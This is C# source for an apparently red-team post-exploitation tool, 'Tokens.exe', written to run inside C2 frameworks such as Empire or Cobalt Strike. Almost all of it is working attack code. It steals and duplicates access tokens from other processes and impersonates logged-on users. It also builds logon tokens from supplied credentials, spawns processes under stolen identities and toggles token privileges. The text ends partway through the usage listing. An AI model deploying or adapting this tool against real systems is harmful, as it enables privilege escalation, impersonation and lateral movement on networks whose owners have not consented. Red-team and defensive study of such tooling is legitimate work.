using System;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;
using System.Management; // You must add the reference to System.Management
using System.Text;
using System.Diagnostics.CodeAnalysis;

using DWORD = System.UInt32;
using LARGE_INTEGER = System.UInt64;

// Note: this code is meant to be run via some sort of execute-assembly style CLR harness that does *not*
// perform a fork-n-run: (e.g.: Powershell Empire's Invoke-Assembly, Badrat's C# rat csharp command).
// This code performs token context switches in the current process over __multiple Tokens.exe executions__.
// This means if you just run Tokens.exe by itself or in a new process (Coblyat Strike execute-assembly)
// that exits after Tokens.exe completion, it will be effectively useless.

// Written based on code from https://xret2pwn.github.io/Access-Token-Part0x01/
// and https://xret2pwn.github.io/Building-Token-Vault-Part0x02/
// and https://github.com/0xbadjuju/Tokenvator/blob/master/Tokenvator/Plugins/Execution/CreateProcess.cs#L75-L150
// Thanks to pinvoke.net for the Pinvoke structures and functions
public class Program
{
    // pinvoke structs/enums section
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [Flags]
    public enum ProcessAccessRights
    {
        PROCESS_CREATE_PROCESS = 0x0080,            // Required to create a process.
        PROCESS_CREATE_THREAD = 0x0002,             // Required to create a thread.
        PROCESS_DUP_HANDLE = 0x0040,                // Required to duplicate a handle using DuplicateHandle.
        PROCESS_QUERY_INFORMATION = 0x0400,         // Required to retrieve certain information about a process, such as its token, exit code, and priority class (see OpenProcessToken, GetExitCodeProcess, GetPriorityClass, and IsProcessInJob).
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000, // Required to retrieve certain information about a process (see QueryFullProcessImageName). A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION. Windows Server 2003 and Windows XP/2000:  This access right is not supported.
        PROCESS_SET_INFORMATION = 0x0200,           // Required to set certain information about a process, such as its priority class (see SetPriorityClass).
        PROCESS_SET_QUOTA = 0x0100,                 // Required to set memory limits using SetProcessWorkingSetSize.
        PROCESS_SUSPEND_RESUME = 0x0800,            // Required to suspend or resume a process.
        PROCESS_TERMINATE = 0x0001,                 // Required to terminate a process using TerminateProcess.
        PROCESS_VM_OPERATION = 0x0008,              // Required to perform an operation on the address space of a process (see VirtualProtectEx and WriteProcessMemory).
        PROCESS_VM_READ = 0x0010,                   // Required to read memory in a process using ReadProcessMemory.
        PROCESS_VM_WRITE = 0x0020,                  // Required to write to memory in a process using WriteProcessMemory.
        DELETE = 0x00010000,                        // Required to delete the object.
        READ_CONTROL = 0x00020000,                  // Required to read information in the security descriptor for the object, not including the information in the SACL. To read or write the SACL, you must request the ACCESS_SYSTEM_SECURITY access right. For more information, see SACL Access Right.
        SYNCHRONIZE = 0x00100000,                   // The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.
        WRITE_DAC = 0x00040000,                     // Required to modify the DACL in the security descriptor for the object.
        WRITE_OWNER = 0x00080000,                   // Required to change the owner in the security descriptor for the object.
        STANDARD_RIGHTS_REQUIRED = 0x000f0000,
        PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFF), // All possible access rights for a process object.
    }

    struct DesiredAccess // used in OpenProcessToken
    {
        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);
    }

    private const int MAXIMUM_ALLOWED = 0x2000000;

    public enum CreationFlags // used with CreateProcessWithTokenW
    {
        DefaultErrorMode = 0x04000000,
        NewConsole = 0x00000010,
        NewProcessGroup = 0x00000200,
        SeparateWOWVDM = 0x00000800,
        Suspended = 0x00000004,
        UnicodeEnvironment = 0x00000400,
        ExtendedStartupInfoPresent = 0x00080000
    }

    public enum LogonFlags // used with CreateProcessWithTokenW
    {
        /// <summary>
        /// Log on, then load the user's profile in the HKEY_USERS registry key. The function
        /// returns after the profile has been loaded. Loading the profile can be time-consuming,
        /// so it is best to use this value only if you must access the information in the
        /// HKEY_CURRENT_USER registry key.
        /// NOTE: Windows Server 2003: The profile is unloaded after the new process has been
        /// terminated, regardless of whether it has created child processes.
        /// </summary>
        /// <remarks>See LOGON_WITH_PROFILE</remarks>
        WithProfile = 1,
        /// <summary>
        /// Log on, but use the specified credentials on the network only. The new process uses the
        /// same token as the caller, but the system creates a new logon session within LSA, and
        /// the process uses the specified credentials as the default credentials.
        /// This value can be used to create a process that uses a different set of credentials
        /// locally than it does remotely. This is useful in inter-domain scenarios where there is
        /// no trust relationship.
        /// The system does not validate the specified credentials. Therefore, the process can start,
        /// but it may not have access to network resources.
        /// </summary>
        /// <remarks>See LOGON_NETCREDENTIALS_ONLY</remarks>
        NetCredentialsOnly = 2
    }

    public enum SECURITY_IMPERSONATION_LEVEL // used in DuplicateTokenEx
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    public enum TOKEN_TYPE // used in DuplicateTokenEx
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES_ARRAY
    {
        public UInt32 PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 30)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public DWORD Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public DWORD LowPart;
        public DWORD HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PRIVILEGE_SET
    {
        public DWORD PrivilegeCount;
        public DWORD Control;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = (Int32)ANYSIZE_ARRAY)]
        public LUID_AND_ATTRIBUTES[] Privilege;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID Luid;
        public uint Attributes;
    }

    public enum LogonProvider
    {
        LOGON32_LOGON_INTERACTIVE = 2,
        LOGON32_LOGON_NETWORK = 3,
        LOGON32_LOGON_BATCH = 4,
        LOGON32_LOGON_SERVICE = 5,
        LOGON32_LOGON_UNLOCK = 7,
        LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
        LOGON32_LOGON_NEW_CREDENTIALS = 9
    }

    public enum LogonUserProvider
    {
        LOGON32_PROVIDER_DEFAULT = 0,
        LOGON32_PROVIDER_WINNT35 = 1,
        LOGON32_PROVIDER_WINNT40 = 2,
        LOGON32_PROVIDER_WINNT50 = 3
    }

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct TOKEN_STATISTICS
    {
        public LUID TokenId;
        public LUID AuthenticationId;
        public LARGE_INTEGER ExpirationTime;
        public TOKEN_TYPE TokenType;
        public SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
        public DWORD DynamicCharged;
        public DWORD DynamicAvailable;
        public DWORD GroupCount;
        public DWORD PrivilegeCount;
        public LUID ModifiedId;
    }

    enum SID_NAME_USE
    {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }

    private struct ProcessInformation
    {
        public IntPtr process;
        public IntPtr thread;
        public int processId;
        public int threadId;
    }

    public const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;

    public const Int32 ANYSIZE_ARRAY = 1;
    public const Int32 PRIVILEGE_SET_ALL_NECESSARY = 1;

    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint SE_PRIVILEGE_NONE = 0x00000000;

    // pinvoke functions section
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags,
        string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
        TOKEN_TYPE TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(string pszUsername, string pszDomain, string pszPassword,
        LogonProvider dwLogonType, LogonUserProvider dwLogonProvider, out IntPtr phToken);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto,
        CallingConvention = CallingConvention.StdCall)]
    extern static bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, ref int ReturnLength);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool LookupAccountSid(string lpSystemName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
        System.Text.StringBuilder lpName, ref uint cchName, System.Text.StringBuilder ReferencedDomainName,
        ref uint cchReferencedDomainName, out SID_NAME_USE peUse);

    [DllImport("kernel32.dll",
           SetLastError = true,
           CharSet = CharSet.Auto)]
    public static extern uint SearchPath(string lpPath,
                    string lpFileName,
                    string lpExtension,
                    int nBufferLength,
                    [MarshalAs ( UnmanagedType.LPTStr )]
                    StringBuilder lpBuffer,
                    out IntPtr lpFilePart);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string systemName, string privilegeName, ref LUID luid);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool LookupPrivilegeName(
        string lpSystemName,
        IntPtr lpLuid,
        StringBuilder lpName,
        ref Int32 cchName
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern Boolean GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern Boolean GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, ref TOKEN_STATISTICS TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern Boolean PrivilegeCheck(IntPtr ClientToken, PRIVILEGE_SET RequiredPrivileges, IntPtr pfResult);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern Boolean PrivilegeCheck(IntPtr ClientToken, ref PRIVILEGE_SET RequiredPrivileges, out Int32 pfResult);

    public struct TokenEntry
    {
        public IntPtr hToken;
        public WindowsIdentity winId;
        public int pid;
    }

    public static List<TokenEntry> TokenList;
    public static IntPtr CurrentToken = WindowsIdentity.GetCurrent().AccessToken.DangerousGetHandle();

    // functions section
    private static void InitTokenList()
    {
        if (Object.Equals(TokenList, default(List<TokenEntry>))) // uninitialized TokenEntry list
        {
            // Initialize new TokenEntry list
            TokenList = new List<TokenEntry>();
        }
    }
    private static void AddToken(IntPtr hToken, int pid) // used to add a token to the TokenEntry List
    {
        TokenEntry entry = new TokenEntry
        {
            hToken = hToken,
            winId = new WindowsIdentity(hToken),
            pid = pid
        };
        TokenList.Add(entry);
    }
    private static void ListTokens()
    {
        int index = 1;
        if (TokenList.Count == 0)
        {
            Console.WriteLine("No tokens available!");
        }
        else
        {
            Console.WriteLine("Index   PID       SID                                             UserName");
            Console.WriteLine("=====   =======   =============================================   ========");
            foreach (TokenEntry entry in TokenList)
            {
                Console.Write(index + new String(' ', 8 - index.ToString().Length));
                Console.Write(entry.pid + new String(' ', 10 - entry.pid.ToString().Length));
                Console.Write(entry.winId.User + new String(' ', 48 - entry.winId.User.ToString().Length));
                Console.WriteLine(entry.winId.Name);

                index++;
            }
        }
    }
    private static bool UseToken(int index)
    {
        if (index > TokenList.Count || index < 1)
        {
            Console.WriteLine("Invalid token index - out of range: 1 - " + TokenList.Count);
            return false;
        }
        IntPtr hToken = TokenList[index - 1].hToken;
        Rev2Self();
        if (!ImpersonateLoggedOnUser(hToken))
        {
            Console.WriteLine("ImpersonateLoggedOnUser failed for token #" + index + ": " + Marshal.GetLastWin32Error());
            CloseHandle(hToken);
            return false;
        }
        CurrentToken = hToken;
        var identity = new WindowsIdentity(CurrentToken);
        WindowsImpersonationContext impersonatedUser = identity.Impersonate();
        Console.WriteLine("Switched to token #" + index);
        return true;
    }
    private static bool MakeToken(string domain, string username, string password, LogonProvider logonType = LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS)
    {
        // Defaults to using logon type 9 (LOGON32_LOGON_NEW_CREDENTIALS)
        if (!LogonUser(username, domain, password, logonType,
            LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out var hToken))
        {
            Console.WriteLine("Error: Couldn't LogonUser with username:password \""
                + domain + "\\" + username + ":" + password + "\"" + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        Rev2Self();
        if (!ImpersonateLoggedOnUser(hToken))
        {
            Console.WriteLine("Succesfully made token, but ImpersonateLoggedOnUser failed: " + Marshal.GetLastWin32Error());
            CloseHandle(hToken);
            return false;
        }

        CurrentToken = hToken;
        var identity = new WindowsIdentity(CurrentToken);
        WindowsImpersonationContext impersonatedUser = identity.Impersonate();
        AddToken(hToken, 0); // Add the token we made to the Token List...
        Console.WriteLine("Successfully made token (" + logonType + " [" + (int)logonType + "]) with username:password \"" + domain + "\\" + username + ":" + password + "\"");
        return true;
    }
    private static bool StealToken(int pid)
    {
        Process process = null;
        IntPtr processHandle = IntPtr.Zero;
        IntPtr tokenHandle = IntPtr.Zero;
        IntPtr dupTokenHandle = IntPtr.Zero;
        try
        {
            process = Process.GetProcessById(pid);
        }
        catch
        {
            Console.WriteLine("No process of pid " + pid.ToString() + " exists!");
            return false;
        }

        processHandle = OpenProcess((uint)ProcessAccessRights.PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine("Error: Couldn't OpenProcess to pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        if (!OpenProcessToken(processHandle, DesiredAccess.TOKEN_QUERY |
            DesiredAccess.TOKEN_DUPLICATE | DesiredAccess.TOKEN_IMPERSONATE,
            out tokenHandle))
        {
            Console.WriteLine("Error: Couldn't OpenProcessToken to pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary,
            out dupTokenHandle))
        {
            Console.WriteLine("Could not DuplicateTokenEx of pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        if (!ImpersonateLoggedOnUser(dupTokenHandle))
        {
            Console.WriteLine("Could not ImpersonateLoggedOnUser for pid " + pid.ToString() + " Error: " + Marshal.GetLastWin32Error());
            return false;
        }

        CurrentToken = dupTokenHandle;
        var identity = new WindowsIdentity(CurrentToken);
        WindowsImpersonationContext impersonatedUser = identity.Impersonate();
        AddToken(dupTokenHandle, pid); // Add the token we made to the Token List...
        Console.WriteLine("Successfully impersonated token from pid " + pid.ToString());
        return true;
    }
    private static List<Int32> SampleProcesses(string username = null)
    {
        // Give a list of processes belonging to a specific user,
        // or if no user given, sample one process from each unique user

        List<Int32> pids = new List<Int32>();
        Dictionary<Int32, String> owners = new Dictionary<Int32, String>();
        int biggestOwnerSize = 5; // Column must be at least (but possibly greater) than 5 chars wide: O W N E R

        // Get a list of all processes
        Process[] processes = Process.GetProcesses();

        ManagementObjectCollection objectCollection;

        // Set up WMI connection. We're going to use this to get the owner of every process
        try
        {
            ManagementScope scope = new ManagementScope(@"\\.\root\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            objectCollection = objectSearcher.Get();
        }
        catch (Exception e)
        {
            Console.WriteLine($"[-] Error: Could not connect to WMI to get process information: {e}");
            return pids;
        }

        // This takes a long time...
        foreach (ManagementObject managementObject in objectCollection)
        {
            String[] owner = new String[2];
            try
            {
                managementObject.InvokeMethod("GetOwner", owner);
            }
            catch
            {
                owner[0] = null;
            }
            String name = owner[0] != null ? owner[1] + "\\" + owner[0] : null;
            owners[Convert.ToInt32(managementObject["Handle"])] = name;
            if (name != null && name.Length > biggestOwnerSize)
            {
                biggestOwnerSize = name.Length;
            }
        }

        if (username == null)
        {
            Dictionary<Int32, String> uniqueOwners = new Dictionary<Int32, String>();
            foreach (KeyValuePair<Int32, String> keyValuePair in owners)
            {
                if (keyValuePair.Value != null && !uniqueOwners.ContainsValue(keyValuePair.Value))
                {
                    uniqueOwners[keyValuePair.Key] = keyValuePair.Value;
                }
            }
            if (uniqueOwners.Count != 0)
            {
                Console.WriteLine("PID     Owner" + new string(' ', biggestOwnerSize - 5) + "   Process Name");
                Console.WriteLine("=====   =====" + new string('=', biggestOwnerSize - 5) + "   ============");
                foreach (KeyValuePair<Int32, String> keyValuePair in uniqueOwners)
                {
                    try
                    {
                        Console.WriteLine(keyValuePair.Key.ToString() + new string(' ', 8 - keyValuePair.Key.ToString().Length) + keyValuePair.Value + new string(' ', biggestOwnerSize - keyValuePair.Value.Length + 3) + Process.GetProcessById(keyValuePair.Key).ProcessName);
                    }
                    catch
                    {
                        Console.WriteLine($"[!] Error getting info on process {keyValuePair.Key}");
                    }
                }
            }
            else
            {
                Console.WriteLine("[!] Could not sample processes for all users!");
            }
        }
        // Don't print, just return the list of PIDs belonging to that user
        else
        {
            foreach (KeyValuePair<Int32, String> keyValuePair in owners)
            {
                if (keyValuePair.Value != null && keyValuePair.Value == username)
                {
                    pids.Add(keyValuePair.Key);
                }
            }
        }
        return pids;
    }
    private static bool ImpersonateUser(string username)
    {
        username = username.Replace('/', '\\'); // Alias to allow forward slashes between DOMAIN and user
        List<Int32> pids = SampleProcesses(username);
        if (pids.Count == 0)
        {
            Console.WriteLine($"[!] No processes found for user {username}. Make sure to include the domain in the user as DOMIN\\username or DOMAIN/username format");
            return false;
        }
        foreach (Int32 pid in pids)
        {
            if (StealToken(pid))
            {
                return true;
            }
        }
        Console.WriteLine($"[!] Attempted to impersonate user {username} failed! ({pids.Count} processes tried)");
        return false;
    }
    private static string parseArgs(string[] args)
    {
        // Used only for CreateProcessWithToken to parse command line arguments
        string result = "";
        int count = 1;

        // basically just wrap args that contain spaces in quotes. All others, just add to the string
        foreach (string arg in args)
        {
            if (arg.Contains(' '))
            {
                result += '"' + arg + '"';
            }
            else
            {
                result += arg;
            }
            if (count != args.Length)
            {
                result += " ";
            }
            count++;
        }
        return result;
    }
    ////////////////////////////////////////////////////////////////////////////////
    // Wrapper for CreateProcessWithTokenW // thx Tokenvator
    ////////////////////////////////////////////////////////////////////////////////
    public static bool CreateProcessWithToken(IntPtr phNewToken, string name, string arguments)
    {
        if (!name.ToLower().EndsWith(".exe"))
        {
            name = name + ".exe"; // Creature comfort. Add the exe file extension if it's not already there
        }
        if (name.Contains(@"\"))
        {
            name = System.IO.Path.GetFullPath(name);
            if (!System.IO.File.Exists(name))
            {
                Console.WriteLine("[-] Executable file not found!");
                return false;
            }
        }
        else
        {
            name = FindFilePath(name);
            if (string.Empty == name)
            {
                Console.WriteLine("[-] Unable to find the specified executable file!");
                return false;
            }
        }
        STARTUPINFO startupInfo = new STARTUPINFO
        {
            cb = Marshal.SizeOf(typeof(STARTUPINFO))
        };
        PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
        if (!CreateProcessWithTokenW(
            phNewToken,
            LogonFlags.NetCredentialsOnly,
            name,
            name + " " + arguments,
            CreationFlags.DefaultErrorMode,
            IntPtr.Zero,
            Environment.CurrentDirectory,
            ref startupInfo,
            out processInformation
        ))
        {
            Console.WriteLine($"[-] Function CreateProcessWithTokenW failed: Error code: {Marshal.GetLastWin32Error()}");
            return false;
        }
        Console.WriteLine("[+] Created process successfully! PID: {0}", processInformation.dwProcessId);
        return true;
    }
    public static string FindFilePath(string name)
    {
        StringBuilder lpFileName = new StringBuilder(260);
        IntPtr lpFilePart = new IntPtr();
        uint result = SearchPath(null, name, null, lpFileName.Capacity, lpFileName, out lpFilePart);
        if (string.Empty == lpFileName.ToString())
        {
            Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
            return string.Empty;
        }
        return lpFileName.ToString();
    }
    public static bool ListPrivs()
    {
        ////////////////////////////////////////////////////////////////////////////////
        // Prints the tokens privileges // Taken from NetSPI's Tokenvator project
        ////////////////////////////////////////////////////////////////////////////////
        int TokenInfLength = 0;
        GetTokenInformation(CurrentToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, 0, ref TokenInfLength);

        if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)
        {
            Console.WriteLine($"[-] Function GetTokenInformation failed: Error code: {Marshal.GetLastWin32Error()}");
            return false;
        }
        IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength);


        if (!GetTokenInformation(CurrentToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, lpTokenInformation, (uint)TokenInfLength, ref TokenInfLength))
        {
            Console.WriteLine($"[-] Function GetTokenInformation failed: Error code: {Marshal.GetLastWin32Error()}");
            return false;
        }
        TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(TOKEN_PRIVILEGES_ARRAY));
        Marshal.FreeHGlobal(lpTokenInformation);
        Console.WriteLine("[*] Enumerated {0} Privileges", tokenPrivileges.PrivilegeCount);
        Console.WriteLine();
        Console.WriteLine("{0,-45}{1,-30}", "Privilege Name", "Enabled");
        Console.WriteLine("{0,-45}{1,-30}", "==============", "=======");

        for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
        {
            StringBuilder lpName = new StringBuilder();
            Int32 cchName = 0;
            IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
            Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);

            LookupPrivilegeName(null, lpLuid, null, ref cchName);
            if (cchName <= 0 || cchName > Int32.MaxValue)
            {
                Console.WriteLine($"[-] Function LookupPrivilegeName failed: Error code: {Marshal.GetLastWin32Error()}");
                Marshal.FreeHGlobal(lpLuid);
                continue;
            }

            lpName.EnsureCapacity(cchName + 1);
            if (!LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
            {
                Console.WriteLine($"[-] Function LookupPrivilegeName (2) failed: Error code: {Marshal.GetLastWin32Error()}");
                Marshal.FreeHGlobal(lpLuid);
                continue;
            }

            PRIVILEGE_SET privilegeSet = new PRIVILEGE_SET
            {
                PrivilegeCount = 1,
                Control = PRIVILEGE_SET_ALL_NECESSARY,
                Privilege = new LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] }
            };

            Int32 pfResult = 0;
            if (!PrivilegeCheck(CurrentToken, ref privilegeSet, out pfResult))
            {
                Console.WriteLine($"[-] Function PrivilegeCheck failed: Error code: {Marshal.GetLastWin32Error()}");
                Marshal.FreeHGlobal(lpLuid);
                continue;
            }
            Console.WriteLine("{0,-45}{1,-30}", lpName.ToString(), Convert.ToBoolean(pfResult));
            Marshal.FreeHGlobal(lpLuid);
        }
        Console.WriteLine();
        return true;
    }
    public static bool EnablePriv(string priv)
    {
        LUID luid = new LUID();
        if (!LookupPrivilegeValue(null, priv, ref luid))
        {
            Console.WriteLine($"[-] Function LookupPrivilegeValue failed: Error code: {Marshal.GetLastWin32Error()}");
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Luid = luid,
            Attributes = SE_PRIVILEGE_ENABLED
        };

        if (!AdjustTokenPrivileges(CurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine($"[-] Function AdjustTokenPrivileges failed: Error code: {Marshal.GetLastWin32Error()}");
        }
        Console.WriteLine($"[+] Successfully enabled privilege: {priv}");
        return true;
    }
    public static bool DisablePriv(string priv)
    {
        LUID luid = new LUID();
        if (!LookupPrivilegeValue(null, priv, ref luid))
        {
            Console.WriteLine($"[-] Function LookupPrivilegeValue failed: Error code: {Marshal.GetLastWin32Error()}");
            return false;
        }

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
        {
            PrivilegeCount = 1,
            Luid = luid,
            Attributes = SE_PRIVILEGE_NONE
        };

        if (!AdjustTokenPrivileges(CurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine($"[-] Function AdjustTokenPrivileges failed: Error code: {Marshal.GetLastWin32Error()}");
        }
        Console.WriteLine($"[+] Successfully disabled privilege: {priv}");
        return true;
    }
    private static bool Rev2Self()
    {
        return RevertToSelf();
    }
    private static string GetCurrentTokenUser()
    {
        return WindowsIdentity.GetCurrent().Name;
    }
    private static void usage()
    {
        Console.WriteLine("Usage:     Tokens.exe <function> [args]\n");
        Console.WriteLine("Usage:     Tokens.exe steal_token <pid>");
        Console.WriteLine("Usage:     Tokens.exe make_token <domain> <username> <password> [logonType]");
        Console.WriteLine("Usage:     Tokens.exe list_tokens");
        Console.WriteLine("Usage:     Tokens.exe sample_processes");
        Console.WriteLine("Usage:     Tokens.exe impersonate_user <domain\\username>");
        Console.WriteLine("Usage:     Tokens.exe create_process <command> [command arguments ...]");
        Console.WriteLine("Usage:     Tokens.exe use_token <token_id>");
        Console.WriteLine("Usage:     Tokens.exe whoami");
        Console.WriteLine("Usage:     Tokens.exe list_privs");
